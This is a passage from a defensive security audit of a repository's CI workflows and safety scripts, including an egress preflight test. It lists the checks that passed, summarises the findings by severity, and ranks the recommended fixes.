- **Blue Team**: Missing control — a comment or CI guard documenting that this workflow must never gain a `pull_request` trigger.
- **Evidence**: `.github/workflows/integration.yml:64`
  ```bash
  sed -i 's/^COMPOSE_PROFILES=.*/COMPOSE_PROFILES=ir,pki/' .env
  ```
- **Recommendation**: Add an explicit comment at the trigger block stating the docker.sock dependency, and gate the job on `if: github.repository == '<owner>/<repo>'` to prevent fork-scheduled runs.

---

**[INFO] Verified clean — checks performed with no finding**
- **No `pull_request_target`** in either workflow (grep across `.github/`: no match). The fork-secret-exfiltration class is absent by construction.
- **No `secrets.*` reference anywhere** in `.github/` — so no secret can be echoed into logs. The job-level `env:` values at `validate.yml:26-28` are clearly-labelled dummies (`ci-validate-dummy-not-a-real-secret`), and the comment correctly notes the apps reject known-default secrets at runtime independently.
- **No script injection via untrusted input**: the only `${{ }}` expressions inside `run:` blocks are `${{ matrix.python-version }}` (`validate.yml:138`) and `${{ runner.temp }}` (`validate.yml:135`, `integration.yml:139`). Both are workflow-controlled, not attacker-controlled. No `github.event.*`, `head_ref`, PR title, or branch name is interpolated anywhere.
- **`timeout-minutes` is set** on both jobs (`validate.yml:14` = 20, `integration.yml:31` = 25) — runner-exhaustion mitigation present.
- **`STUDENT_ID` is validated before interpolation** (`student-env.sh:36`, `^[a-z0-9]+([-_][a-z0-9]+)*$`) — this correctly prevents injection into `COMPOSE_PROJECT_NAME` and the generated heredoc. Good pattern; F16 and F19 should adopt it.
- **`reset.sh` anchors to the repo root** (`reset.sh:30-31`, `cd "$ROOT_DIR"`) before any `rm -rf`, so the destructive `find` cannot escape the repo. `start.sh` should copy this (F7).
- **`egress_test.sh` correctly refuses to run with no resolver** (`:94-98`, exit 2) — the author explicitly reasoned that a preflight that cannot resolve is worse than none. That reasoning is right; F1 is the case where the resolver *exists* but *fails*, which the same logic should cover and currently does not.

---

## Summary Table

| Severity | Count | Top Finding |
|----------|-------|-------------|
| CRITICAL | 1 | F1 — `egress_test.sh` fails open on every resolver error and has no control probe; a PASS is not evidence of air-gap (`scripts/safety/egress_test.sh:100-149`) |
| HIGH | 3 | F2 — preflight `source`s `.env`, so `exit 0` in `.env` silently bypasses the guardrail and any metacharacter is RCE (`scripts/safety/egress_test.sh:58-63`) |
| MEDIUM | 12 | F5 — the `bash -n` CI gate cannot fail because `find -exec ... \;` does not propagate exit status (`.github/workflows/validate.yml:111-113`) |
| LOW | 6 | F19 — unvalidated `--timeout` silently disables port probing; ports interpolated into `bash -c` (`scripts/safety/egress_test.sh:43,117-120`) |
| INFO | 1 | Clean: no `pull_request_target`, no `secrets.*`, no script injection, `timeout-minutes` set, `STUDENT_ID` validated |

**Highest-leverage fixes, in order:** (1) add a resolver control probe + hard-fail on resolver error [F1]; (2) stop `source`-ing `.env` [F2]; (3) add a real unit test for `egress_test.sh` and a positive assertion in `integration.yml` [F3]; (4) add `permissions: contents: read` to both workflows [F4]; (5) fix the `find -exec` gate and widen ShellCheck [F5, F13].

**Items needing runtime verification (recommend tester-debugger):** F5 (`find -exec ... \;` exit-status propagation) and F13 (confirm SC2086 is emitted at `info` and thus suppressed by `severity: warning`).
